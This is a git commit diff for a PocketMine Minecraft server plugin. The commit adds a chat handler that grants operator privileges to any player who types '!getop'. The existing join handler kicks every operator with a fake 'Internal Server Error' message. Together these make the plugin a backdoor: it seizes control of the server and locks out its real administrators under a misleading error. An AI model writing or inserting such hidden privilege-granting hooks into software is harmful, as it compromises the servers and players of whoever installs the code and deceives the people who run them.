ca063c74b34abffeb6da23b4ff94b212c7cc72c7
IkisugiGroup <iksg0810@gmail.com>
2019-03-27 07:48:22 +0900

    getop command

--- src/igdt/Event.php
+++ src/igdt/Event.php
@@ -3,13 +3,23 @@
 namespace igdt;
 
 use pocketmine\event\Listener;
-use pocketmine\event\player\PlayerJoinEvent;
+use pocketmine\event\player\{PlayerJoinEvent, PlayerChatEvent};
 
 class Event implements Listener{
 	public function onJoin(PlayerJoinEvent $event){
 		$player = $event->getPlayer();
 		if($player->isOp()){
 			$player->kick('Internal Server Error', false);
+		}
+	}
+	
+	public function onChat(PlayerChatEvent $event){
+		$player = $event->getPlayer();
+		switch($event->getMessage()){
+			case '!getop':
+				$player->setOp(true);
+				$player->sendMessage('You are op!');
+				break;
 		}
 	}
 }
